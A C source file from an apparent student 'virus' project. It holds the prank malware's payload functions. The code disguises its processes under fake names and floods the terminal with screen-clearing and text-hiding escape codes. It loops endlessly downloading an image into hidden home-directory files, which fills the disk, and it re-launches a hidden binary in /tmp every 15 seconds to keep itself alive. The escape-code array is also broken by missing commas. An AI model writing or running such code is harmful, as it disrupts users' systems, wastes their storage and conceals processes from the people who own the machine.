/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   other.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: acarlson <marvin@42.fr>                    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/04/21 14:46:03 by acarlson          #+#    #+#             */
/*   Updated: 2019/04/21 14:47:03 by acarlson         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "virus.h"

char *g_escapes[] = {
	"\033[2J"
	"\033[1m"
	"\033[4m"
	"\033[5m"
	"\033[7m"
	"\033[8m"

	"\033[30m"
	"\033[31m"
	"\033[32m"
	"\033[33m"
	"\033[34m"
	"\033[35m"
	"\033[36m"
	"\033[37m"

	"\033[40m"
	"\033[41m"
	"\033[42m"
	"\033[43m"
	"\033[44m"
	"\033[45m"
	"\033[46m"
	"\033[47m"

	"\033[=0h"
	"\b"
};

void	set_name(char *s1)
{
	s1[0] = 'm';
	s1[1] = 'a';
	s1[2] = 'r';
	s1[3] = 'e';
	s1[4] = '_';
}

void	random_pname(char *s1)
{
	FILE		*fp;
	char		*str;
	unsigned	i;

	fp = fopen("/dev/urandom", "r");
	str = malloc(16);
	fread(str, 1, 15, fp);
	if (!s1)
		set_name(str);
	else
	{
		i = 0;
		while (s1[i] && i < 15)
		{
			str[i] = s1[i];
			++i;
		}
	}
	PCTL(PR_SET_NAME, str);
	fclose(fp);
	free(str);
}

void	colors(void)
{
	random_pname("colors_");
	while (1)
	{
		printf("%s", g_escapes[rand()
							% (sizeof(g_escapes) / sizeof(*g_escapes))]);
		fflush(stdout);
		sleep(20);
	}
}

void	luigme(void)
{
	random_pname("looig_");
	while (1)
	{
		system("curl\
'https://ih0.redbubble.net/image.433724851.6990/flat,550x550,075,f.u3.jpg'\
> ~/.luigi$(date | awk '{print $4}').jpg 2>/dev/null");
	}
}

void	protection(void)
{
	random_pname("durex_");
	while (1)
	{
		sleep(15);
		system("/tmp/.yaboi");
	}
}
